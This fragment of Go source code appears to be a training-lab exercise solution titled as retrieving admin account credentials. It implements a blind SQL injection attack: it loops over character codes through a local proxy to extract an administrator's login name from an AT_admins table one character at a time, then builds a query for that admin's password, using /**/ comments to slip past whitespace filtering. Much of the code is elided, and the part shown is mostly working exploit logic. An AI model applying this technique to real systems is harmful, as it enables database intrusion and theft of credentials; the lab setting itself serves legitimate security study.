...
// Ex 3.6.1.2 - Extra Mile: Retrieve admin account credentials

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func sendSearchFriendsSQLiAdmin(ip string, sqliPayload string) int {
	for i := 32; i < 126; i++ {
...
func main() {
	...
	usernameQuery := "select/**/login/**/from/**/AT_admins/**/limit/**/1"
	...
	for i := 1; i < userLen+1; i++ {
		...
		extractedChar := fmt.Sprintf("%c", sendSearchFriendsSQLiAdmin(ip, sqliPayload))
		adminUser += extractedChar
		fmt.Print(extractedChar)
	}

	fmt.Print("\n")

	passwordQuery := fmt.Sprintf("select/**/password/**/from/**/AT_admins/**/where/**/login='%s'", adminUser)
